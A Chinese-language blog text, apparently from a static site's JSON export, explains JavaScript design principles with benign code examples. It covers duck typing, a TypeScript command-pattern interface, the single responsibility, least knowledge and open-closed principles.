用鸭子类型进行接口检查鸭子类型的概念：“如果它走起路来像鸭子，叫起来也是鸭子，那么它就是鸭子。” 鸭子类型是动态类型语言面向对象设计中的一个重要概念。利用鸭子类型的思想，不必借助超类型的帮助，就能在动态类型语言中轻松地实现本章提到的设计原则：面向接口编程，而不是面向实现编程。比如，一个对象如果有push和pop方法，并且提供了正确的实现，它就能被当作栈来使用；一个对象如果有length属性，也可以依照下标来存取属性，这个对象就可以被当作数组来使用。如果两个对象拥有相同的方法，则有很大的可能性它们可以被相互替换使用。 在Object.prototype.toString.call([])===&#39;[object Array]&#39;被发现之前，经常用鸭子类型的思想来判断一个对象是否是一个数组，代码如下：123var isArray = function(obj) &#123; return obj &amp;&amp; typeof obj === 'object' &amp;&amp; typeof obj.length === 'number' &amp;&amp; typeof obj.splice === 'function' &#125;; 当然在JavaScript开发中，总是进行接口检查是不明智的，也是没有必要的，毕竟现在还找不到一种好用并且通用的方式来模拟接口检查，跟业务逻辑无关的接口检查也会让很多JavaScript程序员觉得不值得和不习惯。在Ross Harmes和Dustin Diaz合著的Pro JavaScript Design Pattrns一书中，提供了一种根据鸭子类型思想模拟接口检查的方法，但这种基于双重循环的检查方法并不是很实用，而且只能检查对象的某个属性是否属于Function类型。 用TypeScript编写基于interface的命令模式虽然在大多数时候interface给JavaScript开发带来的价值并不像在静态类型语言中那么大，但如果正在编写一个复杂的应用，还是会经常怀念接口的帮助。 下面以基于命令模式的示例来说明interface如何规范程序员的代码编写，这段代码本身并没有什么实用价值，在JavaScript中，一般用闭包和高阶函数来实现命令模式。 假设正在编写一个用户界面程序，页面中有成百上千个子菜单。因为项目很复杂，决定让整个程序都基于命令模式来编写，即编写菜单集合界面的是某个程序员，而负责实现每个子菜单具体功能的工作交给了另外一些程序员。 那些负责实现子菜单功能的程序员，在完成自己的工作之后，会把子菜单封装成一个命令对象，然后把这个命令对象交给编写菜单集合界面的程序员。已经约定好，当调用子菜单对象的execute方法时，会执行对应的子菜单命令。 虽然在开发文档中详细注明了每个子菜单对象都必须有自己的execute方法，但还是有一个粗心的JavaScript程序员忘记给他负责的子菜单对象实现execute方法，于是当执行这个命令的时候，便会报出错误，代码如下：12345678910111213141516171819202122232425262728var RefreshMenuBarCommand = function() &#123;&#125;;RefreshMenuBarCommand.prototype.execute = function() &#123; console.log('刷 新 菜 单 界 面');&#125;;var AddSubMenuCommand = function() &#123;&#125;;AddSubMenuCommand.prototype.execute = function() &#123; console.log('增 加 子 菜 单');&#125;;var DelSubMenuCommand = function() &#123;&#125;; /***** 没 有 实 现 DelSubMenuCommand.prototype.execute *****/// DelSubMenuCommand.prototype.execute = function()&#123;// &#125;; var refreshMenuBarCommand = new RefreshMenuBarCommand(), addSubMenuCommand = new AddSubMenuCommand(), delSubMenuCommand = new DelSubMenuCommand();var setCommand = function(command) &#123; document.getElementById('exeCommand').onclick = function() &#123; command.execute(); &#125; &#125;;setCommand(refreshMenuBarCommand); // 点 击 按 钮 后 输 出：\" 刷 新 菜 单 界 面\"setCommand(addSubMenuCommand); // 点 击 按 钮 后 输 出：\" 增 加 子 菜 单\" setCommand(delSubMenuCommand); // 点 击 按 钮 后 报 错。 Uncaught TypeError: undefined is not a function 为了防止粗心的程序员忘记给某个子命令对象实现execute方法，我们只能在高层函数里添加一些防御性的代码，这样当程序在最终被执行的时候，有可能抛出异常来提醒我们，代码如下：12345678var setCommand = function(command) &#123; document.getElementById('exeCommand').onclick = function() &#123; if (typeof command.execute !== 'function') &#123; throw new Error(\"command 对 象 必 须 实 现 execute 方 法\"); &#125; command.execute(); &#125;&#125;; 如果确实不喜欢重复编写这些防御性代码，还可以尝试使用TypeScript来编写这个程序。 TypeScript是微软开发的一种编程语言，是JavaScript的一个超集。跟CoffeeScript类似，TypeScript代码最终会被编译成原生的JavaScript代码执行。通过TypeScript，可以使用静态语言的方式来编写JavaScript程序。用TypeScript来实现一些设计模式，显得更加原汁原味。 TypeScript提供了interface,下面编写一个TypeScript版本的命令模式。首先定义Command接口,接下来定义RefreshMenuBarCommand、AddSubMenuCommand和DelSubMenuCommand这3个类，它们分别都实现了Command接口，这可以保证它们都拥有execute方法：1234567891011121314151617181920212223242526interface Command &#123; execute: Function;&#125;class RefreshMenuBarCommand implements Command &#123; constructor() &#123;&#125; execute() &#123; console.log('刷 新 菜 单 界 面'); &#125;&#125;class AddSubMenuCommand implements Command &#123; constructor() &#123;&#125; execute() &#123; console.log('增 加 子 菜 单'); &#125;&#125;class DelSubMenuCommand implements Command &#123; constructor() &#123;&#125; // 忘 记 重 写 execute 方 法 &#125;var refreshMenuBarCommand = new RefreshMenuBarCommand(), addSubMenuCommand = new AddSubMenuCommand(), delSubMenuCommand = new DelSubMenuCommand();refreshMenuBarCommand.execute(); // 输 出： 刷 新 菜 单 界 面 addSubMenuCommand.execute(); // 输 出： 增 加 子 菜 单 delSubMenuCommand.execute(); // 输 出： Uncaught TypeError: undefined is not a function 当我们忘记在DelSubMenuCommand类中重写execute方法时，TypeScript提供的编译器及时给出了错误提示。 TypeScript代码翻译过来的JavaScript代码如下：12345678910111213141516171819202122232425262728var RefreshMenuBarCommand = (function() &#123; function RefreshMenuBarCommand() &#123;&#125; RefreshMenuBarCommand.prototype.execute = function() &#123; console.log(' 刷 新 菜 单 界 面'); &#125;; return RefreshMenuBarCommand;&#125;)();var AddSubMenuCommand = (function() &#123; function AddSubMenuCommand() &#123;&#125; AddSubMenuCommand.prototype.execute = function() &#123; console.log(' 增 加 子 菜 单'); &#125;; return AddSubMenuCommand;&#125;)();var DelSubMenuCommand = (function() &#123; function DelSubMenuCommand() &#123;&#125; return DelSubMenuCommand;&#125;)();var refreshMenuBarCommand = new RefreshMenuBarCommand(), addSubMenuCommand = new AddSubMenuCommand(), delSubMenuCommand = new DelSubMenuCommand();refreshMenuBarCommand.execute();addSubMenuCommand.execute();delSubMenuCommand.execute();","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-17-设计原则：单一职责原则/最少知识原则/开放-封闭原则","slug":"js-pattern17","date":"2017-12-06T01:37:10.000Z","updated":"2017-12-06T01:37:10.000Z","comments":true,"path":"2017/12/06/js-pattern17/","link":"","permalink":"https://github.com/xmoyKING/2017/12/06/js-pattern17/","excerpt":"","text":"每种设计模式都是为了让代码迎合其中一个或多个原则而出现的，它们本身已经融入了设计模式之中，给面向对象编程指明了方向。设计原则通常指的是单一职责原则、里氏替换原则、依赖倒置原则、接口隔离原则、合成复用原则和最少知识原则。 单一职责原则就一个类而言，应该仅有一个引起它变化的原因。在JavaScript中，需要用到类的场景并不太多，单一职责原则更多地是被运用在对象或者方法级别上。 单一职责原则（SRP）的职责被定义为“引起变化的原因”。如果我们有两个动机去改写一个方法，那么这个方法就具有两个职责。每个职责都是变化的一个轴线，如果一个方法承担了过多的职责，那么在需求的变迁过程中，需要改写这个方法的可能性就越大。 此时，这个方法通常是一个不稳定的方法，修改代码总是一件危险的事情，特别是当两个职责耦合在一起的时候，一个职责发生变化可能会影响到其他职责的实现，造成意想不到的破坏，这种耦合性得到的是低内聚和脆弱的设计。因此，SRP原则体现为：一个对象（方法）只做一件事情。 设计模式中的SRP原则SRP原则在很多设计模式中都有着广泛的运用，例如代理模式、迭代器模式、单例模式和装饰者模式。 代理模式图片预加载的例子,通过增加虚拟代理的方式，把预加载图片的职责放到代理对象中，而本体仅仅负责往页面中添加img标签，这也是它最原始的职责。 myImage负责往页面中添加img标签：123456789var myImage = (function() &#123; var imgNode = document.createElement('img'); document.body.appendChild(imgNode); return &#123; setSrc: function(src) &#123; imgNode.src = src; &#125; &#125;&#125;)(); proxyImage负责预加载图片，并在预加载完成之后把请求交给本体myImage：12345678910111213var proxyImage = (function() &#123; var img = new Image; img.onload = function() &#123; myImage.setSrc(this.src); &#125; return &#123; setSrc: function(src) &#123; myImage.setSrc('loading.gif'); img.src = src; &#125; &#125;&#125;)();proxyImage.setSrc('photo.jpg'); 把添加img标签的功能和预加载图片的职责分开放到两个对象中，这两个对象各自都只有一个被修改的动机。在它们各自发生改变的时候，也不会影响另外的对象。 迭代器模式假设一段代码，先遍历一个集合，然后往页面中添加一些div，这些div的innerHTML分别对应集合里的元素：12345678var appendDiv = function(data) &#123; for (var i = 0, l = data.length; i &lt; l; i++) &#123; var div = document.createElement('div'); div.innerHTML = data[i]; document.body.appendChild(div); &#125; &#125;;appendDiv([1, 2, 3, 4, 5, 6]); 这其实是一段很常见的代码，经常用于ajax请求之后，在回调函数中遍历ajax请求返回的数据，然后在页面中渲染节点。 appendDiv函数本来只是负责渲染数据，但是在这里它还承担了遍历聚合对象data的职责。如果返回的data数据格式从array变成了object，那我们遍历data的代码就会出现问题，必须改成for(var i in data)的方式，这时候必须去修改appendDiv里的代码，否则因为遍历方式的改变，导致不能顺利往页面中添加div节点。 有必要把遍历data的职责提取出来，这正是迭代器模式的意义，迭代器模式提供了一种方法来访问聚合对象，而不用暴露这个对象的内部表示。 当把迭代聚合对象的职责单独封装在each函数中后，即使以后还要增加新的迭代方式，我们只需要修改each函数即可，appendDiv函数不会受到牵连，代码如下：1234567891011121314151617181920212223242526272829var each = function(obj, callback) &#123; var value, i = 0, length = obj.length, isArray = isArraylike(obj); // isArraylike 函 数 未 实 现， 可 以 翻 阅 jQuery 源 代 码 if (isArray) &#123; // 迭 代 类 数 组 for (; i &lt; length; i++) &#123; callback.call(obj[i], i, obj[i]); &#125; &#125; else &#123; for (i in obj) &#123; // 迭 代 object 对 象 value = callback.call(obj[i], i, obj[i]); &#125; &#125; return obj; &#125;;var appendDiv = function(data) &#123; each(data, function(i, n) &#123; var div = document.createElement('div'); div.innerHTML = n; document.body.appendChild(div); &#125;); &#125;;appendDiv([1, 2, 3, 4, 5, 6]);appendDiv(&#123; a: 1, b: 2, c: 3, d: 4&#125;); 单例模式惰性单例例子中，最开始的代码是这样的：123456789101112var createLoginLayer = (function() &#123; var div; return function() &#123; if (!div) &#123; div = document.createElement('div'); div.innerHTML = '我 是 登 录 浮 窗'; div.style.display = 'none'; document.body.appendChild(div); &#125; return div; &#125;&#125;)(); 现在把管理单例的职责和创建登录浮窗的职责分别封装在两个方法里，这两个方法可以独立变化而互不影响，当它们连接在一起的时候，就完成了创建唯一登录浮窗的功能，下面的代码显然是更好的做法：12345678910111213141516var getSingle = function(fn) &#123; // 获 取 单 例 var result; return function() &#123; return result || (result = fn.apply(this, arguments)); &#125; &#125;;var createLoginLayer = function() &#123; // 创 建 登 录 浮 窗 var div = document.createElement('div'); div.innerHTML = '我 是 登 录 浮 窗'; document.body.appendChild(div); return div; &#125;;var createSingleLoginLayer = getSingle(createLoginLayer);var loginLayer1 = createSingleLoginLayer();var loginLayer2 = createSingleLoginLayer();alert(loginLayer1 === loginLayer2); // 输 出： true 装饰者模式使用装饰者模式的时候，通常让类或者对象一开始只具有一些基础的职责，更多的职责在代码运行时被动态装饰到对象上面。装饰者模式可以为对象动态增加职责，从另一个角度来看，这也是分离职责的一种方式。 下面的例子把数据上报的功能单独放在一个函数里，然后把这个函数动态装饰到业务函数上面：123456789101112131415Function.prototype.after = function(afterfn) &#123; var __self = this; return function() &#123; var ret = __self.apply(this, arguments); afterfn.apply(this, arguments); return ret; &#125;&#125;;var showLogin = function() &#123; console.log('打 开 登 录 浮 层'); &#125;;var log = function() &#123; console.log('上 报 标 签 为: ' + this.getAttribute('tag')); &#125;;document.getElementById('button').onclick = showLogin.after(log); // 打 开 登 录 浮 层 之 后 上 报 数 据 SRP原则的应用难点是如何去分离职责。 何时应该分离职责SRP原则是所有原则中最简单也是最难正确运用的原则之一。 要明确的是，并不是所有的职责都应该一一分离。 一方面，如果随着需求的变化，有两个职责总是同时变化，那就不必分离他们。比如在ajax请求的时候，创建xhr对象和发送xhr请求几乎总是在一起的，那么创建xhr对象的职责和发送xhr请求的职责就没有必要分开。 另一方面，职责的变化轴线仅当它们确定会发生变化时才具有意义，即使两个职责已经被耦合在一起，但它们还没有发生改变的征兆，那么也许没有必要主动分离它们，在代码需要重构的时候再进行分离也不迟。 违反SRP原则在人的常规思维中，总是习惯性地把一组相关的行为放到一起，如何正确地分离职责不是一件容易的事情。 我们也许从来没有考虑过如何分离职责，但这并不妨碍我们编写代码完成需求。对于SRP原则，许多专家委婉地表示“This is some times hard to see.”。 一方面，我们受设计原则的指导，另一方面，我们未必要在任何时候都一成不变地遵守原则。在实际开发中，因为种种原因违反SRP的情况并不少见。比如jQuery的attr等方法，就是明显违反SRP原则的做法。jQuery的attr是个非常庞大的方法，既负责赋值，又负责取值，这对于jQuery的维护者来说，会带来一些困难，但对于jQuery的用户来说，却简化了用户的使用。 在方便性与稳定性之间要有一些取舍。具体是选择方便性还是稳定性，并没有标准答案，而是要取决于具体的应用环境。比如如果一个电视机内置了DVD机，当电视机坏了的时候，DVD机也没法正常使用，那么一个DVD发烧友通常不会选择这样的电视机。但如果我们的客厅本来就小得夸张，或者更在意DVD在使用上的方便，那让电视机和DVD机耦合在一起就是更好的选择。 SRP原则的优缺点SRP原则的优点是降低了单个类或者对象的复杂度，按照职责把对象分解成更小的粒度，这有助于代码的复用，也有利于进行单元测试。当一个职责需要变更的时候，不会影响到其他的职责。 但SRP原则也有一些缺点，最明显的是会增加编写代码的复杂度。当我们按照职责把对象分解成更小的粒度之后，实际上也增大了这些对象之间相互联系的难度。 最少知识原则最少知识原则（LKP）说的是一个软件实体应当尽可能少地与其他实体发生相互作用。这里的软件实体是一个广义的概念，不仅包括对象，还包括系统、类、模块、函数、变量等。主要针对对象来说明这个原则，下面引用《面向对象设计原理与模式》一书中的例子来解释最少知识原则： 某军队中的将军需要挖掘一些散兵坑。下面是完成任务的一种方式：将军可以通知上校让他叫来少校，然后让少校找来上尉，并让上尉通知一个军士，最后军士唤来一个士兵，然后命令士兵挖掘一些散兵坑。 这种方式十分荒谬，不是吗？不过，我们还是先来看一下这个过程的等价代码：1gerneral.getColonel(c).getMajor(m).getCaptain(c).getSergeant(s).getPrivate(p).digFoxhole(); 让代码通过这么长的消息链才能完成一个任务，这就像让将军通过那么多繁琐的步骤才能命令别人挖掘散兵坑一样荒谬！而且，这条链中任何一个对象的改动都会影响整条链的结果。 最有可能的是，将军自己根本就不会考虑挖散兵坑这样的细节信息。但是如果将军真的考虑了这个问题的话，他一定会通知某个军官：“我不关心这个工作如何完成，但是你得命令人去挖散兵坑。” 减少对象之间的联系单一职责原则指导我们把对象划分成较小的粒度，这可以提高对象的可复用性。但越来越多的对象之间可能会产生错综复杂的联系，如果修改了其中一个对象，很可能会影响到跟它相互引用的其他对象。对象和对象耦合在一起，有可能会降低它们的可复用性。在程序中，对象的“朋友”太多并不是一件好事，“城门失火，殃及池鱼”和“一人犯法，株连九族”的故事时有发生。 最少知识原则要求我们在设计程序时，应当尽量减少对象之间的交互。如果两个对象之间不必彼此直接通信，那么这两个对象就不要发生直接的相互联系。常见的做法是引入一个第三者对象，来承担这些对象之间的通信作用。如果一些对象需要向另一些对象发起请求，可以通过第三者对象来转发这些请求。 设计模式中的最少知识原则最少知识原则在设计模式中体现得最多的地方是中介者模式和外观模式。 中介者模式曾讲过一个博彩公司的例子。 在世界杯期间购买足球彩票，如果没有博彩公司作为中介，上千万的人一起计算赔率和输赢绝对是不可能的事情。博彩公司作为中介，每个人都只和博彩公司发生关联，博彩公司会根据所有人的投注情况计算好赔率，彩民们赢了钱就从博彩公司拿，输了钱就赔给博彩公司。 中介者模式很好地体现了最少知识原则。通过增加一个中介者对象，让所有的相关对象都通过中介者对象来通信，而不是互相引用。所以，当一个对象发生改变时，只需要通知中介者对象即可。 外观模式外观模式在JavaScript中的使用场景并不多。外观模式主要是为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使子系统更加容易使用，如图所示。外观模式的作用是对客户屏蔽一组子系统的复杂性。外观模式对客户提供一个简单易用的高层接口，高层接口会把客户的请求转发给子系统来完成具体的功能实现。大多数客户都可以通过请求外观接口来达到访问子系统的目的。但在一段使用了外观模式的程序中，请求外观并不是强制的。如果外观不能满足客户的个性化需求，那么客户也可以选择越过外观来直接访问子系统。 拿全自动洗衣机的一键洗衣按钮举例，这个一键洗衣按钮就是一个外观。如果是老式洗衣机，客户要手动选择浸泡、洗衣、漂洗、脱水这4个步骤。如果这种洗衣机被淘汰了，新式洗衣机的漂洗方式发生了改变，那我们还得学习新的漂洗方式。而全自动洗衣机的好处很明显，不管洗衣机内部如何进化，客户要操作的，始终只是一个一键洗衣的按钮。这个按钮就是为一组子系统所创建的外观。但如果一键洗衣程序设定的默认漂洗时间是20分钟，而客户希望这个漂洗时间是30分钟，那么客户自然可以选择越过一键洗衣程序，自己手动来控制这些“子系统”运转。 外观模式容易跟普通的封装实现混淆。这两者都封装了一些事物，但外观模式的关键是定义一个高层接口去封装一组“子系统”。子系统在C++或者Java中指的是一组类的集合，这些类相互协作可以组成系统中一个相对独立的部分。在JavaScript中我们通常不会过多地考虑“类”，如果将外观模式映射到JavaScript中，这个子系统至少应该指的是一组函数的集合。 最简单的外观模式应该是类似下面的代码：12345var A = function()&#123; a1(); a2(); &#125; var B = function()&#123; b1(); b2(); &#125; var facade = function()&#123; A(); B(); &#125; facade(); 许多JavaScript设计模式的图书或者文章喜欢把jQuery的$.ajax函数当作外观模式的实现，这是不合适的。如果$.ajax函数属于外观模式，那几乎所有的函数都可以被称为“外观模式”。问题是我们根本没有办法越过$.ajax“外观”去直接使用该函数中的某一段语句。 现在再来看看外观模式和最少知识原则之间的关系。外观模式的作用主要有两点。 为一组子系统提供一个简单便利的访问入口。 隔离客户与复杂子系统之间的联系，客户不用去了解子系统的细节。 从第二点来，外观模式是符合最少知识原则的。比如全自动洗衣机的一键洗衣按钮，隔开了客户和浸泡、洗衣、漂洗、脱水这些子系统的直接联系，客户不用去了解这些子系统的具体实现。 假设我们在编写这个老式洗衣机的程序，客户至少要和浸泡、洗衣、漂洗、脱水这4个子系统打交道。如果其中的一个子系统发生了改变，那么客户的调用代码就得发生改变。而通过外观将客户和这些子系统隔开之后，如果修改子系统内部，只要外观不变，就不会影响客户的调用。同样，对外观的修改也不会影响到子系统，它们可以分别变化而互不影响。 封装在最少知识原则中的体现封装在很大程度上表达的是数据的隐藏。一个模块或者对象可以将内部的数据或者实现细节隐藏起来，只暴露必要的接口API供外界访问。对象之间难免产生联系，当一个对象必须引用另外一个对象的时候，我们可以让对象只暴露必要的接口，让对象之间的联系限制在最小的范围之内。 同时，封装也用来限制变量的作用域。在JavaScript中对变量作用域的规定是： 变量在全局声明，或者在代码的任何位置隐式申明（不用var），则该变量在全局可见； 变量在函数内显式申明（使用var），则在函数内可见。 把变量的可见性限制在一个尽可能小的范围内，这个变量对其他不相关模块的影响就越小，变量被改写和发生冲突的机会也越小。这也是广义的最少知识原则的一种体现。 假设我们要编写一个具有缓存效果的计算乘积的函数function mult(){}，我们需要一个对象var cache={}来保存已经计算过的结果。cache对象显然只对mult有用，把cache对象放在mult形成的闭包中，显然比把它放在全局作用域更加合适，代码如下：123456789101112131415var mult = (function() &#123; var cache = &#123;&#125;; return function() &#123; var args = Array.prototype.join.call(arguments, ','); if (cache[args]) &#123; return cache[args]; &#125; var a = 1; for (var i = 0, l = arguments.length; i &lt; l; i++) &#123; a = a * arguments[i]; &#125; return cache[args] = a; &#125;&#125;)();mult(1, 2, 3); // 输 出： 6 其实，最少知识原则也叫迪米特法则（Law of Demeter，LoD），“迪米特”这个名字源自1987年美国东北大学一个名为“Demeter”的研究项目。 许多人更倾向于使用迪米特法则这个名字，也许是因为显得更酷一点。但参考《Head First Design Patterns》的建议，称之为最少知识原则。一是因为这个名字更能体现其含义，另一个原因是“法则”给人的感觉是必须强制遵守，而原则只是一种指导，没有哪条原则是在实际开发中必须遵守的。比如，虽然遵守最小知识原则减少了对象之间的依赖，但也有可能增加一些庞大到难以维护的第三者对象。跟单一职责原则一样，在实际开发中，是否选择让代码符合最少知识原则，要根据具体的环境来定。 开放-封闭原则在面向对象的程序设计中，开放-封闭原则（OCP）是最重要的一条原则。很多时候，一个程序具有良好的设计，往往说明它是符合开放-封闭原则的。 开放-封闭原则最早由Eiffel语言的设计者Bertrand Meyer在其著作Object-Oriented Software Construction中提出。它的定义如下： 软件实体（类、模块、函数）等应该是可以扩展的，但是不可修改。 在明白开放-封闭原则的定义之前，先看一个示例，在window.onload函数中添加一些新的功能。 扩展window.onload函数假设我们是一个大型Web项目的维护人员，在接手这个项目时，发现它已经拥有10万行以上的JavaScript代码和数百个JS文件。 不久后接到了一个新的需求，即在window.onload函数中打印出页面中的所有节点数量。于是搜索出window.onload函数在文件中的位置，在函数内部添加以下代码：1234window.onload = function()&#123; // 原 有 代 码 略 console.log( document.getElementsByTagName('*').length ); &#125;; 在项目需求变迁的过程中，经常会找到相关代码，然后改写它们。这似乎是理所当然的事情，不改动代码怎么满足新的需求呢？想要扩展一个模块，最常用的方式当然是修改它的源代码。如果一个模块不允许修改，那么它的行为常常是固定的。然而，改动代码是一种危险的行为，也许我们都遇到过bug越改越多的场景。刚刚改好了一个bug，但是又在不知不觉中引发了其他的bug。 如果目前的window.onload函数是一个拥有500行代码的巨型函数，里面密布着各种变量和交叉的业务逻辑，而需求又不仅仅是打印一个log这么简单。那么“改好一个bug，引发其他bug”这样的事情就很可能会发生。我们永远不知道刚刚的改动会有什么副作用，很可能会引发一系列的连锁反应。 那么，有没有办法在不修改代码的情况下，就能满足新需求呢？通过增加代码，而不是修改代码的方式，来给window.onload函数添加新的功能，代码如下：123456789101112Function.prototype.after = function(afterfn) &#123; var __self = this; return function() &#123; var ret = __self.apply(this, arguments); afterfn.apply(this, arguments); return ret; &#125;&#125;;window.onload = (window.onload || function() &#123;&#125;).after(function() &#123; console.log(document.getElementsByTagName('*').length);&#125;); 通过动态装饰函数的方式，我们完全不用理会从前window.onload函数的内部实现，无论它的实现优雅或是丑陋。就算我们作为维护者，拿到的是一份混淆压缩过的代码也没有关系。只要它从前是个稳定运行的函数，那么以后也不会因为我们的新增需求而产生错误。新增的代码和原有的代码可以井水不犯河水。 开放和封闭为window.onload函数扩展功能时，用到了两种方式。一种是修改原有的代码，另一种是增加一段新的代码。使用哪种方式效果更好，已经不言而喻。 现在可以引出开放-封闭原则的思想：当需要改变一个程序的功能或者给这个程序增加新功能的时候，可以使用增加代码的方式，但是不允许改动程序的源代码。 在现实生活中，我们也能找到一些跟开放-封闭原则相关的故事。 有一家生产肥皂的大企业，从欧洲花巨资引入了一条生产线。这条生产线可以自动完成从原材料加工到包装成箱的整个流程，但美中不足的是，生产出来的肥皂有一定的空盒几率。于是老板又从欧洲找来一支专家团队，花费数百万元改造这一生产线，终于解决了生产出空盒肥皂的问题。 另一家企业也引入了这条生产线，他们同样遇到了空盒肥皂的问题。但他们的解决办法很简单：用一个大风扇在生产线旁边吹，空盒肥皂就会被吹走。 这个故事告诉我们，相比修改源程序，如果通过增加几行代码就能解决问题，那这显然更加简单和优雅，而且增加代码并不会影响原系统的稳定。讲述这个故事，目的不在于说明风扇的成本有多低，而是想说明，如果使用风扇这样简单的方式可以解决问题，根本没有必要去大动干戈地改造原有的生产线。 用对象的多态性消除条件分支过多的条件分支语句是造成程序违反开放-封闭原则的一个常见原因。每当需要增加一个新的if语句时，都要被迫改动原函数。把if换成switch-case是没有用的，这是一种换汤不换药的做法。实际上，每当我们看到一大片的if或者swtich-case语句时，第一时间就应该考虑，能否利用对象的多态性来重构它们。 利用对象的多态性来让程序遵守开放-封闭原则，是一个常用的技巧。例如让动物发出叫声的例子。下面先提供一段不符合开放-封闭原则的代码。每当我们增加一种新的动物时，都需要改动makeSound函数的内部实现：1234567891011var makeSound = function(animal) &#123; if (animal instanceof Duck) &#123; console.log('嘎 嘎 嘎'); &#125; else if (animal instanceof Chicken) &#123; console.log('咯 咯 咯'); &#125; &#125;;var Duck = function() &#123;&#125;;var Chicken = function() &#123;&#125;;makeSound(new Duck()); // 输 出： 嘎 嘎 嘎makeSound(new Chicken()); // 输 出： 咯 咯 咯 利用多态的思想，我们把程序中不变的部分隔离出来（动物都会叫），然后把可变的部分封装起来（不同类型的动物发出不同的叫声），这样一来程序就具有了可扩展性。当我们想让一只狗发出叫声时，只需增加一段代码即可，而不用去改动原有的makeSound函数：1234567891011121314151617181920var makeSound = function(animal) &#123; animal.sound();&#125;;var Duck = function() &#123;&#125;;Duck.prototype.sound = function() &#123; console.log('嘎 嘎 嘎');&#125;;var Chicken = function() &#123;&#125;;Chicken.prototype.sound = function() &#123; console.log('咯 咯 咯');&#125;;makeSound(new Duck()); // 嘎 嘎 嘎 makeSound(new Chicken()); // 咯 咯 咯 /********* 增 加 动 物 狗， 不 用 改 动 原 有 的 makeSound 函 数 ****************/var Dog = function() &#123;&#125;;Dog.prototype.sound = function() &#123; console.log('汪 汪 汪');&#125;;makeSound(new Dog()); // 汪 汪 汪 找出变化的地方开放-封闭原则是一个看起来比较虚幻的原则，并没有实际的模板教导我们怎样亦步亦趋地实现它。但我们还是能找到一些让程序尽量遵守开放-封闭原则的规律，最明显的就是找出程序中将要发生变化的地方，然后把变化封装起来。 通过封装变化的方式，可以把系统中稳定不变的部分和容易变化的部分隔离开来。在系统的演变过程中，我们只需要替换那些容易变化的部分，如果这些部分是已经被封装好的，那么替换起来也相对容易。而变化部分之外的就是稳定的部分。在系统的演变过程中，稳定的部分是不需要改变的。 在例子中，由于每种动物的叫声都不同，所以动物具体怎么叫是可变的，于是我们把动物具体怎么叫的逻辑从makeSound函数中分离出来。 而动物都会叫这是不变的，makeSound函数里的实现逻辑只跟动物都会叫有关，这样一来，makeSound就成了一个稳定和封闭的函数。 除了利用对象的多态性之外，还有其他方式可以帮助我们编写遵守开放-封闭原则的代码。 放置挂钩放置挂钩（hook）也是分离变化的一种方式。在程序有可能发生变化的地方放置一个挂钩，挂钩的返回结果决定了程序的下一步走向。这样一来，原本的代码执行路径上就出现了一个分叉路口，程序未来的执行方向被预埋下多种可能性。 在jQuery源代码中，jQuery从1.4版本开始，陆续加入了fixHooks、keyHooks、mouseHooks、cssHooks等挂钩。 Template Method模式中的父类是一个相当稳定的类，它封装了子类的算法骨架和执行步骤。 由于子类的数量是无限制的，总会有一些“个性化”的子类迫使我们不得不去改变已经封装好的算法骨架。于是我们可以在父类中的某个容易变化的地方放置挂钩，挂钩的返回结果由具体子类决定。这样一来，程序就拥有了变化的可能。 使用回调函数在JavaScript中，函数可以作为参数传递给另外一个函数，这是高阶函数的意义之一。在这种情况下，通常会把这个函数称为回调函数。在JavaScript版本的设计模式中，策略模式和命令模式等都可以用回调函数轻松实现。 回调函数是一种特殊的挂钩。我们可以把一部分易于变化的逻辑封装在回调函数里，然后把回调函数当作参数传入一个稳定和封闭的函数中。当回调函数被执行的时候，程序就可以因为回调函数的内部逻辑不同，而产生不同的结果。 比如，通过ajax异步请求用户信息之后要做一些事情，请求用户信息的过程是不变的，而获取到用户信息之后要做什么事情，则是可能变化的：123456789var getUserInfo = function(callback) &#123; $.ajax('getUserInfo', callback);&#125;;getUserInfo(function(data) &#123; console.log(data.userName);&#125;);getUserInfo(function(data) &#123; console.log(data.userId);&#125;); 另外一个例子是关于Array.prototype.map的。在不支持Array.prototype.map的浏览器中，可以简单地模拟实现一个map函数。 arrayMap函数的作用是把一个数组“映射”为另外一个数组。映射的步骤是不变的，而映射的规则是可变的，于是把这部分规则放在回调函数中，传入arrayMap函数：12345678910111213141516171819var arrayMap = function(ary, callback) &#123; var i = 0, length = ary.length, value, ret = []; for (; i &lt; length; i++) &#123; value = callback(i, ary[i]); ret.push(value); &#125; return ret;&#125;var a = arrayMap([1, 2, 3], function(i, n) &#123; return n * 2;&#125;);var b = arrayMap([1, 2, 3], function(i, n) &#123; return n * 3;&#125;);console.log(a); // 输 出：[ 2, 4, 6 ] console.log(b); // 输 出：[ 3, 6, 9 ] 设计模式中的开放－封闭原则有一种说法是，设计模式就是给做的好的设计取个名字。几乎所有的设计模式都是遵守开放-封闭原则的，我们见到的好设计，通常都经得起开放-封闭原则的考验。不管是具体的各种设计模式，还是更抽象的面向对象设计原则，比如单一职责原则、最少知识原则、依赖倒置原则等，都是为了让程序遵守开放-封闭原则而出现的。可以这样说，开放-封闭原则是编写一个好程序的目标，其他设计原则都是达到这个目标的过程。 例举几个模式，来更深一步地了解设计模式在遵守开放-封闭原则方面做出的努力。 发布-订阅模式发布-订阅模式用来降低多个对象之间的依赖关系，它可以取代对象之间硬编码的通知机制，一个对象不用再显式地调用另外一个对象的某个接口。当有新的订阅者出现时，发布者的代码不需要进行任何修改；同样当发布者需要改变时，也不会影响到之前的订阅者。 模板方法模式我们曾提到，模板方法模式是一种典型的通过封装变化来提高系统扩展性的设计模式。在一个运用了模板方法模式的程序中，子类的方法种类和执行顺序都是不变的，所以我们把这部分逻辑抽出来放到父类的模板方法里面；而子类的方法具体怎么实现则是可变的，于是把这部分变化的逻辑封装到子类中。通过增加新的子类，便能给系统增加新的功能，并不需要改动抽象父类以及其他的子类，这也是符合开放-封闭原则的。 策略模式策略模式和模板方法模式是一对竞争者。在大多数情况下，它们可以相互替换使用。模板方法模式基于继承的思想，而策略模式则偏重于组合和委托。 策略模式将各种算法都封装成单独的策略类，这些策略类可以被交换使用。策略和使用策略的客户代码可以分别独立进行修改而互不影响。我们增加一个新的策略类也非常方便，完全不用修改之前的代码。 